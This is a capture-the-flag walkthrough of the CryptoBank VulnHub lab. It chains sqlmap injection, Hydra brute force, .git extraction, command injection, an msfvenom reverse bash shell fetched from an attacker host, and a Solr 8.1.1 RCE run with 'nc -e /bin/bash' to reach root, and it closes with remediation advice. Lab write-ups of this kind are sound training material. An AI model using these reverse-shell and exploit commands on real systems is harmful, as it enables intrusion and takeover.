# CryptoBank: 1 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.105 |
| **Difficulty** | Intermediate |
| **OS** | Linux |
| **Goal** | root flag (`/root/flag.txt`) |
| **Source** | [HackingArticles](https://www.hackingarticles.in/cryptobank-1-vulnhub-walkthrough/) |

## Attack Summary

Web enumeration reveals a virtual hostname; time-based SQL injection dumps credentials; command injection in a discovered development tool delivers a reverse shell; an internal Apache Solr RCE instance is reached via port forwarding; unrestricted sudo escalates to root.

## Methodology

1. Recon — nmap scan, virtual hostname discovery
2. Enumeration — dirb, Hydra, GitHack, credential extraction
3. Exploitation — SQLMap (time-based), command injection, msfvenom payload
4. Post-Exploitation — port forwarding, Solr RCE
5. Privilege Escalation — sudo su with known password

## Step 1: Reconnaissance

```bash
netdiscover -r 192.168.1.0/24
```

```bash
nmap -sV $TARGET
```

![nmap scan](images/01-nmap.png)

Open ports: **22** (SSH) and **80** (HTTP).

The main page (`http://$TARGET`) has a "Secure Login" button linking to `http://cryptobank.local/trade`. Add the virtual hostname to `/etc/hosts`:

```bash
echo "$TARGET cryptobank.local" | sudo tee -a /etc/hosts
```

## Step 2: Username Discovery

Navigate to the CORE TEAM section on the homepage. Each employee's email icon links to a URL containing their name (e.g., `mailto:julius.b@...`). Collect these as potential usernames into a file:

```bash
cat > users.txt << 'EOF'
julius.b
[additional names from the page]
EOF
```

## Step 3: SQL Injection — Credential Extraction

Navigate to `http://cryptobank.local/trade` (the Secure Login form). Capture a POST request with Burp Suite and save it as `req.txt`.

Enumerate databases:

```bash
sqlmap -r req.txt --dbs --batch
```

![sqlmap dbs](images/02-sqlmap.png)

Target the `cryptobank` database:

```bash
sqlmap -r req.txt -D cryptobank --tables --batch
```

Dump the `accounts` table:

```bash
sqlmap -r req.txt -D cryptobank -T accounts --dump --batch
```

This is a time-based blind injection; extraction takes several minutes. The output includes 12 account entries with plaintext or recoverable passwords.

## Step 4: Directory Bruteforce and Development Login

Run dirb against the virtual host:

```bash
dirb http://cryptobank.local/
```

A `/development` directory is found. Use Hydra to identify valid credentials for its HTTP Basic Auth:

```bash
hydra -L users.txt -P pass.txt cryptobank.local -f http-get /development
```

Valid pair: `julius.b` / `wJWm4CgV26`.

Run dirb inside `/development` with credentials:

```bash
dirb http://cryptobank.local/development/ -u julius.b:wJWm4CgV26
```

Directories found: `/development/tools/` and `/development/backups/`. Bruteforce `/development/backups/home/`:

```bash
dirb http://cryptobank.local/development/backups/home/
```

A `.git` directory is exposed.

## Step 5: Git Repository Extraction

Clone GitHack and extract the repository:

```bash
git clone https://github.com/lijiejie/GitHack.git
cd GitHack
python GitHack.py http://cryptobank.local/development/backups/home/.git/
```

Inside the extracted `cryptobank.local/` directory, navigate to `tools/CommandExecution/`. The PHP source reveals a password for the command execution endpoint: `wJWm4CgV26`.

## Step 6: Command Injection — Reverse Shell

Browse to the CommandExecution tool in the browser. It offers a "Run system command" option. Verify execution:

- Username field: `id`
- Password field: `wJWm4CgV26`

The `id` output confirms code execution.

Craft a reverse bash payload with msfvenom:

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=$LHOST LPORT=$LPORT -f raw > revshell.sh
```

Host it:

```bash
python3 -m http.server 8000
```

Use the command injection to download it:

```bash
wget http://$LHOST:8000/revshell.sh
```

Start a Metasploit listener:

```bash
use exploit/multi/handler
set payload cmd/unix/reverse_bash
set LHOST $LHOST
set LPORT $LPORT
exploit
```

Execute the payload through the injection point:

```bash
bash revshell.sh
```

![reverse shell](images/03-reverse-shell.png)

Initial shell obtained as `www-data`.

## Step 7: Internal Service Discovery

Upgrade to a Meterpreter session:

```bash
sessions -u 1
sessions 2
```

Check internal network connections:

```bash
netstat -antp
```

Port **8983** is listening on `172.17.0.1` (a Docker network interface). This is Apache Solr.

## Step 8: Port Forwarding to Solr

Forward port 8983 from the Meterpreter session:

```bash
portfwd add -l 8983 -p 8983 -r 172.17.0.1
```

Browse to `http://127.0.0.1:8983/` on the attacker. Apache Solr version **8.1.1** is confirmed.

## Step 9: Solr RCE

Search for an exploit:

```bash
searchsploit solr
searchsploit -m 47572
```

Upload the exploit to the target's `/tmp` directory via Meterpreter. Upgrade the shell to TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Start a netcat listener:

```bash
nc -lvp 7654
```

Execute the Solr RCE exploit from the target shell:

```bash
cd /tmp
python3 47572.py 172.17.0.1 8983 "nc -e /bin/bash $LHOST 7654"
```

![solr rce](images/04-solr-rce.png)

A shell arrives on the listener.

## Step 10: Privilege Escalation

In the new Solr shell, upgrade to TTY and check sudo permissions:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
sudo -l
```

Full sudo access is available. The Solr default password is the same as the service account password:

```bash
sudo su
# Password: solr
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cd /root
cat flag.txt
```

![root flag](images/05-root-flag.png)

## Lessons Learned

1. Exposed `.git` directories on a web server allow complete source code and credential recovery.
2. Time-based SQL injection is viable even when no direct error output is present.
3. Reusing the same password across multiple services (SQL dump → development auth → command execution → Solr) allows pivoting through the entire chain with a single credential.
4. Running internal services such as Solr inside Docker does not protect them if the host machine is already compromised and port forwarding is available.

## Remediation

| Vulnerability | Fix |
|---|---|
| Exposed `.git` directory | Block `.git` access in web server config; never serve repositories from the document root |
| Time-based SQL injection | Use parameterized queries / prepared statements |
| Command injection in tool | Sanitize all input; avoid passing user data to shell commands |
| Solr 8.1.1 RCE | Upgrade Solr; bind to loopback only; add authentication |
| Unrestricted sudo | Follow least-privilege; remove `NOPASSWD` entries and unnecessary sudo grants |
| Password reuse | Enforce unique credentials per service |
